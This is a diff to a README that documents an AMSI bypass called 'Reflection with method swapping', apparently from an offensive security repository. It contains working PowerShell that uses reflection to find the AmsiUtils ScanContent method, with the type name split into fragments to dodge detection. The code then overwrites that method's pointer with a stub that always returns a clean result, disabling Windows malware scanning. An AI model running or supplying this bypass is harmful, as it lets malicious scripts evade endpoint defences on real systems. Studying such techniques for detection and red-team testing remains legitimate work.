@@ -2,6 +2,8 @@
 This new technique is called "Reflection with method swapping". Opens doors for other techniques such as ETW and CLM possibly(?).
 Uses reflection to get a handle to the "ScanContent" method and updates it to point to a method we control. 
 
+*Note: PrepareMethod() is not neccessary but preferred for both the "raw powershell" and .cs versions
+
 ## Inspiration
 https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/
 
@@ -16,7 +18,7 @@ https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/
 class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
 $o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
 $t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
-[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)
+[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
 [System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
 [System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
 ```
